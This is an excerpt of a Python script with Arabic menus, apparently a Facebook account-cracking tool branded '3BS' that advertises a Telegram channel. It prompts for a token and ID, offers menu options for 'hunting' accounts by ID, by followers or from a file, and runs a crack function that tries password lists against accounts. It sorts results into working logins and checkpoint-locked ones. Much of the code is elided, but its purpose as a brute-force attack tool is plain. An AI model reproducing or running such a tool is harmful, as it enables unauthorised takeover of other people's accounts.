...
P = '\033[2;35m' #وردي
print('')
token=input(f"{B}-{C} تـوكـن {X}:{F} ")
print('\n')
ID=input(f"{B}-{C} ايـدي {X}:{F} ")
os.system('clear')
pretty.install()
CON=sol()
...
def banner():
	...
	#output = render('𝟑𝐁𝐒' ,colors=[str(choice(['white'])),str(choice(['yellow'])), str(choice(['white','yellow','yellow']))],align='left',space='0')
	print('هكر محتوى غير معين')
	print(f'''{asu}      
{B}┏{Z}━{B}━{Z}━{B}━{Z}━{B}━{Z}━{B}━{Z}━{B}━{Z}━{B}━{Z}━{B}━{Z}━{B}━{Z}━{B}━{Z}━{B}━{Z}━{B}┓
{Z}┃ {C}⌯ {X}Channel : اصدار 2.1{Z}┃
{B}┃{Z}━{B}━{Z}━{B}━{Z}━{B}━{Z}━{B}━{Z}━{B}━{Z}━{B}━{Z}━{B}━{Z}━{B}━{Z}━{B}━{Z}━{B}━{Z}━{B}┃
{Z}┃ {C}⌯ {X}Telegram : @TTL9T{Z}  ┃ 
{B}┗{Z}━{B}━{Z}━{B}━{Z}━{B}━{Z}━{B}━{Z}━{B}━{Z}━{B}━{Z}━{B}━{Z}━{B}━{Z}━{B}━{Z}━{B}━{Z}━{B}┛                                                       
''')
os.system('clear')
...
class login():
	...
	def login_epa(self):
		...
		print(f''''\033[1;34m                                          
              ...
              ▏\033[33mPROGRAM \033[2;35m   : \033[2;32m3BS \033[1;34m▕             
              ▏\033[33mChannel    \033[2;35m: \033[2;32m اصدار الاداه2.1 \033[1;34m▕              
              ▏\033[33mTele       \033[2;35m: \033[2;32m@TTL9T\033[1;34m▕
              ▏\033[33mTools      \033[2;35m: \033[2;32m\033[1;34m ▕            
              ⌎\033[1;34m━━━━━━━━━━━━━━━━━━━━━━━━━━\033[1;34m⌏''') 
		print(50 * '-')
...
def main_menu():
	...
	print(55* '-')
	print((k+"["+p+"1"+k+"]"+p+" اضـافـة كـوكـيـز "))
	print((k+"["+p+"2"+k+"]"+p+" صـيـد مـن ايـدي "))
	print((k+"["+p+"3"+k+"]"+p+" صـيـد من الـمـتابـعـيـن "))
	print((k+"["+p+"4"+k+"]"+p+" صـيـد مـن مـلـف "))
	print((k+"["+p+"5"+k+"]"+p+" انـشـاء مـلـف "))
	print((k+"["+p+"6"+k+"]"+p+" مـعـطـل "))
	print((k+"["+p+"7"+k+"]"+p+" تـرتـيـب مـلـف الايـديات "))
	print((k+"["+p+"0"+k+"]"+p+" تـسـجـيـل خـروج "))
	print(55* '-')
	menu = input((k+""+p+ "اخـتـر : "))
	if menu in ['01','1']:
...
def passwrd():
	print('\033[0;92m==================')
	print("\033[97;1m[\033[92;1m➢\033[97;1m] \x1b[33m\x1b[33m\x1b[33m[\033[0;92m\x1b[36m3BS\x1b[33m] \033[1;92m ")
...
def crack(idf,pwv):
	...
	rc = random.choice
	amr = rc(['🚬'])
	sys.stdout.write(f"\r{bo}{amr} 𝟑𝐁𝐒  {loop}•{len(id)}  • OK:{ok} •  CP:{cp} • ({'{:.0%}'.format(loop/float(len(id)))}{amr})"),
	sys.stdout.flush()
	...
	for pw in pwv:
		try:
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				statuscp = f'''حـسـاب سـكـيـور ميفيدك 
					'''
				statuscp1 = nel(statuscp, style='red')
				cetak(nel(statuscp1, title='3BS'))
...
𖣘────━𓆩𝟑𝐁𝐒𓆪━────𖣘	
				...
				cetak(nel(statuscp1, title='شـغـال'))
